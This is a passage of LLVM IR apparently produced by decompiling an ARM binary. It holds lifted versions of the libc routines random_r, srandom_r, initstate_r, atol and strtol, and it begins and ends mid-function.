  store i32 %v5_13d64, i32* %v3_13d6c, align 4
  %v0_13d70 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d70 = load i32, i32* %r4.global-to-local, align 4
  %v2_13d70 = add i32 %v1_13d70, 8
  %v3_13d70 = inttoptr i32 %v2_13d70 to i32*
  store i32 %v0_13d70, i32* %v3_13d70, align 4
  %v1_13d90.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13d88

dec_label_pc_13d78:                               ; preds = %bb
  %v0_13d78 = call i32 @__GI___errno_location()
  %v2_13d80 = inttoptr i32 %v0_13d78 to i32*
  store i32 22, i32* %v2_13d80, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13d88

dec_label_pc_13d88:                               ; preds = %dec_label_pc_13d64, %dec_label_pc_13d78
  %v1_13d90 = phi i32 [ %v1_13d90.pre, %dec_label_pc_13d64 ], [ -1, %dec_label_pc_13d78 ]
  %v2_13d8c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13d8c, i32* @r4, align 4
  ret i32 %v1_13d90

; uselistorder directives
  uselistorder i32 %v0_13d54, { 1, 0 }
  uselistorder i32 %v2_13d50, { 1, 0 }
  uselistorder i32 %v3_13cf8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 8, 9, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d88, { 1, 0 }
  uselistorder label %dec_label_pc_13d64, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d9c = load i32, i32* @r4, align 4
  store i32 %v3_13d9c, i32* %stack_var_-8, align 4
  %v1_13da0 = add i32 %tmp, 12
  %v2_13da0 = inttoptr i32 %v1_13da0 to i8*
  %v3_13da0 = load i8, i8* %v2_13da0, align 1
  %v4_13da0 = sext i8 %v3_13da0 to i32
  store i32 %v4_13da0, i32* %r3.global-to-local, align 4
  %v2_13da4 = icmp eq i8 %v3_13da0, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_13db0 = add i32 %tmp, 8
  %v2_13db0 = inttoptr i32 %v1_13db0 to i32*
  %v3_13db0 = load i32, i32* %v2_13db0, align 4
  store i32 %v3_13db0, i32* %lr.global-to-local, align 4
  br i1 %v2_13da4, label %dec_label_pc_13db8, label %dec_label_pc_13ddc

dec_label_pc_13db8:                               ; preds = %entry
  %v1_13db8 = inttoptr i32 %v3_13db0 to i32*
  %v2_13db8 = load i32, i32* %v1_13db8, align 4
  store i32 %v2_13db8, i32* %r2.global-to-local, align 4
  %v2_13dc0 = mul i32 %v2_13db8, 1103515245
  %v1_13dc8 = add i32 %v2_13dc0, 12345
  %tmp6 = bitcast i32 %v1_13dc8 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_13dcc = bitcast float %tmp7 to i32
  store i32 %v1_13dcc, i32* %r3.global-to-local, align 4
  store i32 %v1_13dcc, i32* %v1_13db8, align 4
  %v0_13dd4 = load i32, i32* %r3.global-to-local, align 4
  %v2_13dd4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_13dd4, i32* %v2_13dd4, align 4
  br label %dec_label_pc_13e1c

dec_label_pc_13ddc:                               ; preds = %entry
  %v2_13ddc = load i32, i32* %arg1, align 4
  store i32 %v2_13ddc, i32* %r2.global-to-local, align 4
  %v1_13de0 = add i32 %tmp, 4
  %v2_13de0 = inttoptr i32 %v1_13de0 to i32*
  %v3_13de0 = load i32, i32* %v2_13de0, align 4
  store i32 %v3_13de0, i32* %r0.global-to-local, align 4
  %v1_13de4 = inttoptr i32 %v2_13ddc to i32*
  %v2_13de4 = load i32, i32* %v1_13de4, align 4
  store i32 %v2_13de4, i32* %r1.global-to-local, align 4
  %v1_13de8 = inttoptr i32 %v3_13de0 to i32*
  %v2_13de8 = load i32, i32* %v1_13de8, align 4
  %v4_13de8 = add i32 %v3_13de0, 4
  store i32 %v4_13de8, i32* %r0.global-to-local, align 4
  %v2_13dec = add i32 %v2_13de8, %v2_13de4
  store i32 %v2_13dec, i32* %r3.global-to-local, align 4
  store i32 %v2_13dec, i32* %v1_13de4, align 4
  %v3_13df0 = load i32, i32* %r2.global-to-local, align 4
  %v4_13df0 = add i32 %v3_13df0, 4
  store i32 %v4_13df0, i32* %r2.global-to-local, align 4
  %v0_13df4 = load i32, i32* %ip.global-to-local, align 4
  %v1_13df4 = add i32 %v0_13df4, 16
  %v2_13df4 = inttoptr i32 %v1_13df4 to i32*
  %v3_13df4 = load i32, i32* %v2_13df4, align 4
  store i32 %v3_13df4, i32* %r1.global-to-local, align 4
  %v0_13df8 = load i32, i32* %r3.global-to-local, align 4
  %v3_13df8 = udiv i32 %v0_13df8, 2
  store i32 %v3_13df8, i32* %r3.global-to-local, align 4
  %v3_13dfc = icmp ult i32 %v4_13df0, %v3_13df4
  %v1_13e00 = load i32, i32* %r4.global-to-local, align 4
  %v2_13e00 = inttoptr i32 %v1_13e00 to i32*
  store i32 %v3_13df8, i32* %v2_13e00, align 4
  br i1 %v3_13dfc, label %dec_label_pc_13e0c, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_13ddc
  %v1_13e04 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13e04, i32* %r2.global-to-local, align 4
  %v0_13e14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13ddc
  %v0_13e0c = load i32, i32* %r0.global-to-local, align 4
  %v1_13e0c = load i32, i32* %r1.global-to-local, align 4
  %v3_13e0c = icmp ult i32 %v0_13e0c, %v1_13e0c
  br i1 %v3_13e0c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_13e0c
  %v1_13e10 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13e10, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_13e0c, %._crit_edge, %bb
  %v0_13e14 = phi i32 [ %v0_13e14.pre, %._crit_edge ], [ %v0_13e0c, %dec_label_pc_13e0c ], [ %v1_13e10, %bb ]
  %v1_13e14 = load i32, i32* %ip.global-to-local, align 4
  %v2_13e14 = add i32 %v1_13e14, 4
  %v3_13e14 = inttoptr i32 %v2_13e14 to i32*
  store i32 %v0_13e14, i32* %v3_13e14, align 4
  %v0_13e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e18 = load i32, i32* %ip.global-to-local, align 4
  %v2_13e18 = inttoptr i32 %v1_13e18 to i32*
  store i32 %v0_13e18, i32* %v2_13e18, align 4
  br label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13db8, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13e20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e20, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_13df8, { 1, 0 }
  uselistorder i32 %v1_13dcc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_13e1c, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13e2c = load i32, i32* @r4, align 4
  store i32 %v3_13e2c, i32* %stack_var_-36, align 4
  %v1_13e30 = add i32 %tmp, 12
  %v2_13e30 = inttoptr i32 %v1_13e30 to i8*
  %v3_13e30 = load i8, i8* %v2_13e30, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_13e40 = load i8, i8* %v2_13e30, align 1
  %tmp33 = icmp ugt i8 %v3_13e30, 4
  br i1 %tmp33, label %.dec_label_pc_13eec_crit_edge, label %dec_label_pc_13e4c

.dec_label_pc_13eec_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13eec

dec_label_pc_13e4c:                               ; preds = %entry
  %v0_13e4c = load i32, i32* @r0, align 4
  %v2_13e4c = icmp eq i32 %v0_13e4c, 0
  %v1_13e50 = add i32 %tmp, 8
  %v2_13e50 = inttoptr i32 %v1_13e50 to i32*
  %v3_13e50 = load i32, i32* %v2_13e50, align 4
  store i32 %v3_13e50, i32* %r6.global-to-local, align 4
  br i1 %v2_13e4c, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_13e4c
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13e4c, %bb
  %v0_13e5c = phi i32 [ %v0_13e4c, %dec_label_pc_13e4c ], [ 1, %bb ]
  %v2_13e58 = icmp eq i8 %v3_13e40, 0
  %v2_13e5c = inttoptr i32 %v3_13e50 to i32*
  store i32 %v0_13e5c, i32* %v2_13e5c, align 4
  br i1 %v2_13e58, label %dec_label_pc_13ee8, label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %bb23
  %v1_13e64 = add i32 %tmp, 13
  %v2_13e64 = inttoptr i32 %v1_13e64 to i8*
  %v3_13e64 = load i8, i8* %v2_13e64, align 1
  %v4_13e64 = sext i8 %v3_13e64 to i32
  store i32 %v4_13e64, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_13e70 = load i32, i32* @r0, align 4
  store i32 %v0_13e70, i32* %r4.global-to-local, align 4
  %v0_13e74 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13e74, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_13eb425 = icmp sgt i8 %v3_13e64, 1
  br i1 %v5_13eb425, label %dec_label_pc_13e80, label %dec_label_pc_13eb8

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e64, %dec_label_pc_13e80.dec_label_pc_13e80_crit_edge
  %v1_13e94 = phi i32 [ %v1_13e94.pre, %dec_label_pc_13e80.dec_label_pc_13e80_crit_edge ], [ 2836, %dec_label_pc_13e64 ]
  %v1_13e88 = phi i32 [ %v1_13e88.pre, %dec_label_pc_13e80.dec_label_pc_13e80_crit_edge ], [ 16807, %dec_label_pc_13e64 ]
  %v0_13e8427 = phi i32 [ %v0_13ea8.pre, %dec_label_pc_13e80.dec_label_pc_13e80_crit_edge ], [ %v0_13e70, %dec_label_pc_13e64 ]
  %v1_13ea026 = phi i32 [ %v5_13ea0, %dec_label_pc_13e80.dec_label_pc_13e80_crit_edge ], [ %v0_13e74, %dec_label_pc_13e64 ]
  %v3_13e80 = urem i32 %v0_13e8427, 127773
  %v2_13e88 = mul i32 %v1_13e88, %v3_13e80
  %v2_13e90 = sdiv i32 %v0_13e8427, 127773
  %v2_13e94 = mul i32 %v1_13e94, %v2_13e90
  %v2_13e98 = sub i32 %v2_13e88, %v2_13e94
  %v8_13e98 = icmp slt i32 %v2_13e98, 0
  %v2_13e9c = add i32 %v2_13e98, 2147483647
  %v2_13e9c.v2_13e98 = select i1 %v8_13e98, i32 %v2_13e9c, i32 %v2_13e98
  store i32 %v2_13e9c.v2_13e98, i32* %r4.global-to-local, align 4
  %v2_13ea0 = add i32 %v1_13ea026, 4
  %v3_13ea0 = inttoptr i32 %v2_13ea0 to i32*
  store i32 %v2_13e9c.v2_13e98, i32* %v3_13ea0, align 4
  %v4_13ea0 = load i32, i32* %r8.global-to-local, align 4
  %v5_13ea0 = add i32 %v4_13ea0, 4
  store i32 %v5_13ea0, i32* %r8.global-to-local, align 4
  %v0_13ea4.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_13ea4.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_13ea8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13eb0 = add i32 %v0_13ea4.pre, 1
  store i32 %v1_13eb0, i32* %r7.global-to-local, align 4
  %v5_13eb4 = icmp slt i32 %v0_13ea4.pre, %v1_13ea4.pre
  br i1 %v5_13eb4, label %dec_label_pc_13e80.dec_label_pc_13e80_crit_edge, label %dec_label_pc_13ea4.dec_label_pc_13eb8_crit_edge

dec_label_pc_13e80.dec_label_pc_13e80_crit_edge:  ; preds = %dec_label_pc_13e80
  %v1_13e88.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_13e94.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13e80

dec_label_pc_13ea4.dec_label_pc_13eb8_crit_edge:  ; preds = %dec_label_pc_13e80
  %v0_13ec8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13eb8

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13ea4.dec_label_pc_13eb8_crit_edge, %dec_label_pc_13e64
  %v0_13ec8 = phi i32 [ %v0_13ec8.pre, %dec_label_pc_13ea4.dec_label_pc_13eb8_crit_edge ], [ %v0_13e74, %dec_label_pc_13e64 ]
  %v0_13ebc.lcssa = phi i32 [ %v1_13ea4.pre, %dec_label_pc_13ea4.dec_label_pc_13eb8_crit_edge ], [ %v4_13e64, %dec_label_pc_13e64 ]
  %v2_13ebc = mul i32 %v0_13ebc.lcssa, 10
  store i32 %v2_13ebc, i32* @r4, align 4
  %v0_13ec0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ec0 = add i32 %v0_13ec0, 14
  %v2_13ec0 = inttoptr i32 %v1_13ec0 to i8*
  %v3_13ec0 = load i8, i8* %v2_13ec0, align 1
  %v4_13ec0 = sext i8 %v3_13ec0 to i32
  %v2_13ec4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_13ec4, i32* %r7.global-to-local, align 4
  %v4_13ec8 = mul nsw i32 %v4_13ec0, 4
  %v5_13ec8 = add i32 %v0_13ec8, %v4_13ec8
  %v1_13ecc = inttoptr i32 %v0_13ec0 to i32*
  store i32 %v5_13ec8, i32* %v1_13ecc, align 4
  %v3_13ecc = add i32 %v0_13ec0, 4
  %v4_13ecc = inttoptr i32 %v3_13ecc to i32*
  %v5_13ecc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_13ecc, i32* %v4_13ecc, align 4
  br label %dec_label_pc_13ed8

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ed8
  %v0_13edc = load i32, i32* %r5.global-to-local, align 4
  %v2_13ed4 = inttoptr i32 %v0_13edc to i32*
  %v3_13ed4 = call i32 @__GI_random_r(i32* %v2_13ed4, i32 %v2_13ec4)
  br label %dec_label_pc_13ed8

dec_label_pc_13ed8:                               ; preds = %dec_label_pc_13eb8, %dec_label_pc_13ed4
  %v0_13ed8 = load i32, i32* @r4, align 4
  %v1_13ed8 = add i32 %v0_13ed8, -1
  store i32 %v1_13ed8, i32* @r4, align 4
  %v6_13ed8 = icmp slt i32 %v1_13ed8, 0
  br i1 %v6_13ed8, label %dec_label_pc_13ee8, label %dec_label_pc_13ed4

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13ed8, %bb23
  %v2_13ef0.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %.dec_label_pc_13eec_crit_edge, %dec_label_pc_13ee8
  %v2_13ef0 = phi i32 [ %v3_13e2c, %.dec_label_pc_13eec_crit_edge ], [ %v2_13ef0.pre, %dec_label_pc_13ee8 ]
  %v1_13ef4 = phi i32 [ -1, %.dec_label_pc_13eec_crit_edge ], [ 0, %dec_label_pc_13ee8 ]
  store i32 %v2_13ef0, i32* @r4, align 4
  ret i32 %v1_13ef4

; uselistorder directives
  uselistorder i32 %v1_13ed8, { 1, 0 }
  uselistorder i32 %v0_13ec0, { 1, 0, 2 }
  uselistorder i32 %v0_13ea4.pre, { 1, 0 }
  uselistorder i32 %v5_13ea0, { 1, 0 }
  uselistorder i32 %v0_13e8427, { 1, 0 }
  uselistorder i32 %v0_13e74, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_13eec, { 1, 0 }
  uselistorder label %dec_label_pc_13ed8, { 1, 0 }
  uselistorder label %dec_label_pc_13e80, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13ef8:
  %v0_13ef8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ef8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13ef8
  %v2_13ef8 = load i32, i32* @r7, align 4
  %v5_13ef8 = udiv i32 %v2_13ef8, 8
  %v6_13ef8 = and i32 %v5_13ef8, %arg1
  %v3_13efc = load i32, i32* @fp, align 4
  %v8_13efc = shl i32 %v6_13ef8, %v3_13efc
  %v9_13efc = and i32 %v8_13efc, %arg1
  %v2_13f00 = load i32, i32* @sp, align 4
  %v8_13f00 = shl i32 %v2_13f00, %arg3
  %v9_13f00 = and i32 %v8_13f00, %arg2
  call void @__pseudo_branch(i32 %v9_13f00)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13ef8, %bb
  %v10_13f00 = phi i32 [ %arg1, %dec_label_pc_13ef8 ], [ %v9_13efc, %bb ]
  ret i32 %v10_13f00

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_13f04 = load i32, i32* @r4, align 4
  %v6_13f04 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_13f34, label %dec_label_pc_13f24

dec_label_pc_13f24:                               ; preds = %entry
  %v2_13f24 = icmp ugt i32 %arg2, 254
  %v7_13f24 = icmp eq i32 %arg2, 255
  %v2_13f28 = xor i1 %v7_13f24, true
  %v3_13f28 = and i1 %v2_13f24, %v2_13f28
  br i1 %v3_13f28, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_13f24
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13f24, %bb
  %v1_13f607 = phi i32 [ %v3_13f04, %dec_label_pc_13f24 ], [ 4, %bb ]
  %v2_13f2c = xor i1 %v2_13f24, true
  %v3_13f2c = or i1 %v7_13f24, %v2_13f2c
  br i1 %v3_13f2c, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_13f34:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_13f4c, label %dec_label_pc_13f3c

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13f34
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_13fbc

.thread10:                                        ; preds = %dec_label_pc_13f3c
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f34
  %v2_13f4c = icmp ugt i32 %arg2, 62
  %v7_13f4c = icmp eq i32 %arg2, 63
  %v2_13f50 = xor i1 %v7_13f4c, true
  %v3_13f50 = and i1 %v2_13f4c, %v2_13f50
  br i1 %v3_13f50, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_13f4c
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_13f4c, %bb23
  %v1_13f606 = phi i32 [ %v3_13f04, %dec_label_pc_13f4c ], [ 2, %bb23 ]
  %v2_13f54 = xor i1 %v2_13f4c, true
  %v3_13f54 = or i1 %v7_13f4c, %v2_13f54
  br i1 %v3_13f54, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_13f6c = phi i32 [ 3, %bb22 ], [ %v1_13f607, %bb21 ], [ %v1_13f606, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35156), i32* %r3.global-to-local, align 4
  %v4_13f60 = mul i32 %v1_13f6c, 4
  %v5_13f60 = add i32 %v4_13f60, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35156)
  store i32 %v5_13f60, i32* %r2.global-to-local, align 4
  %v1_13f64 = add i32 %v4_13f60, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35136)
  %v2_13f64 = inttoptr i32 %v1_13f64 to i32*
  %v3_13f64 = load i32, i32* %v2_13f64, align 4
  store i32 %v3_13f64, i32* %r1.global-to-local, align 4
  %v1_13f68 = add i32 %tmp, 4
  store i32 %v1_13f68, i32* @r6, align 4
  %v6_13f6c = inttoptr i32 %v5_13f60 to i32*
  %v7_13f6c = load i32, i32* %v6_13f6c, align 4
  store i32 %v7_13f6c, i32* %r2.global-to-local, align 4
  %v4_13f70 = mul i32 %v3_13f64, 4
  %v5_13f70 = add i32 %v4_13f70, %v1_13f68
  store i32 %v5_13f70, i32* %r3.global-to-local, align 4
  %v2_13f74 = add i32 %arg3, 16
  %v3_13f74 = inttoptr i32 %v2_13f74 to i32*
  store i32 %v5_13f70, i32* %v3_13f74, align 4
  %v0_13f78 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f78 = trunc i32 %v0_13f78 to i8
  %v2_13f78 = load i32, i32* @r5, align 4
  %v3_13f78 = add i32 %v2_13f78, 14
  %v4_13f78 = inttoptr i32 %v3_13f78 to i8*
  store i8 %v1_13f78, i8* %v4_13f78, align 1
  %v0_13f7c = load i32, i32* %r1.global-to-local, align 4
  %v1_13f7c = trunc i32 %v0_13f7c to i8
  %v2_13f7c = load i32, i32* @r5, align 4
  %v3_13f7c = add i32 %v2_13f7c, 13
  %v4_13f7c = inttoptr i32 %v3_13f7c to i8*
  store i8 %v1_13f7c, i8* %v4_13f7c, align 1
  %v0_13f80 = load i32, i32* @r4, align 4
  %v1_13f80 = trunc i32 %v0_13f80 to i8
  %v2_13f80 = load i32, i32* @r5, align 4
  %v3_13f80 = add i32 %v2_13f80, 12
  %v4_13f80 = inttoptr i32 %v3_13f80 to i8*
  store i8 %v1_13f80, i8* %v4_13f80, align 1
  %v0_13f84 = load i32, i32* @r6, align 4
  %v1_13f84 = load i32, i32* @r5, align 4
  %v2_13f84 = add i32 %v1_13f84, 8
  %v3_13f84 = inttoptr i32 %v2_13f84 to i32*
  store i32 %v0_13f84, i32* %v3_13f84, align 4
  %v0_13f88 = load i32, i32* @r5, align 4
  store i32 %v0_13f88, i32* %r1.global-to-local, align 4
  %v0_13f8c = load i32, i32* @r0, align 4
  %v2_13f8c = inttoptr i32 %v0_13f8c to i32*
  %v3_13f8c = call i32 @srandom_r(i32* %v2_13f8c, i32 %v0_13f88)
  store i32 %v3_13f8c, i32* %r0.global-to-local, align 4
  %v0_13f90 = load i32, i32* @r4, align 4
  %v2_13f90 = icmp eq i32 %v0_13f90, 0
  br i1 %v2_13f90, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_13fac12 = load i32, i32* @r7, align 4
  %v2_13fac13 = inttoptr i32 %v1_13fac12 to i32*
  store i32 0, i32* %v2_13fac13, align 4
  %v1_13fb0 = load i32, i32* @r4, align 4
  store i32 %v1_13fb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fd4

.thread4:                                         ; preds = %bb26
  %v1_13f94 = load i32, i32* @r5, align 4
  %v2_13f94 = add i32 %v1_13f94, 4
  %v3_13f94 = inttoptr i32 %v2_13f94 to i32*
  %v4_13f94 = load i32, i32* %v3_13f94, align 4
  %v1_13f98 = load i32, i32* @r6, align 4
  %v3_13f98 = sub i32 %v4_13f94, %v1_13f98
  %v4_13f9c = sdiv i32 %v3_13f98, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_13fa4 = mul i32 %v4_13f9c, 5
  %v5_13fa4 = add i32 %v4_13fa4, %v0_13f90
  store i32 %v5_13fa4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13fac = load i32, i32* @r7, align 4
  %v2_13fac = inttoptr i32 %v1_13fac to i32*
  store i32 0, i32* %v2_13fac, align 4
  %v1_13fb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_13fb4 = load i32, i32* @r7, align 4
  %v3_13fb4 = inttoptr i32 %v2_13fb4 to i32*
  store i32 %v1_13fb4, i32* %v3_13fb4, align 4
  %v1_13fdc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13f3c
  %v0_13fbc = call i32 @__GI___errno_location()
  store i32 %v0_13fbc, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_13fc4 = inttoptr i32 %v0_13fbc to i32*
  store i32 22, i32* %v2_13fc4, align 4
  %v0_13fc8 = call i32 @__GI___errno_location()
  %v0_13fcc = load i32, i32* %r4.global-to-local, align 4
  %v2_13fcc = inttoptr i32 %v0_13fc8 to i32*
  store i32 %v0_13fcc, i32* %v2_13fcc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13fd4:                               ; preds = %bb27, %.thread4, %dec_label_pc_13fbc
  %v1_13fdc = phi i32 [ %v1_13fdc.pre, %.thread4 ], [ %v1_13fb0, %bb27 ], [ -1, %dec_label_pc_13fbc ]
  store i32 %v3_13f04, i32* @r4, align 4
  store i32 %v6_13f04, i32* @r5, align 4
  ret i32 %v1_13fdc

; uselistorder directives
  uselistorder i1 %v7_13f4c, { 1, 0 }
  uselistorder i1 %v7_13f24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35156), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_13fd4, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13ff8 = call i32 @strtol()
  ret i32 %v0_13ff8
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_14014 = call i32 @_stdlib_strto_l()
  ret i32 %v0_14014
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_14038 = load i32, i32* @r1, align 4
  store i32 %v0_14038, i32* %fp.global-to-local, align 4
  %v0_1403c = load i32, i32* @r2, align 4
  store i32 %v0_1403c, i32* %r5.global-to-local, align 4
  %v0_14040 = load i32, i32* @r0, align 4
  store i32 %v0_14040, i32* %r4.global-to-local, align 4
  %v0_14044 = load i32, i32* @r3, align 4
  br label %dec_label_pc_14050

dec_label_pc_1404c:                               ; preds = %dec_label_pc_14050
  %v1_1404c = add i32 %v0_14088, 1
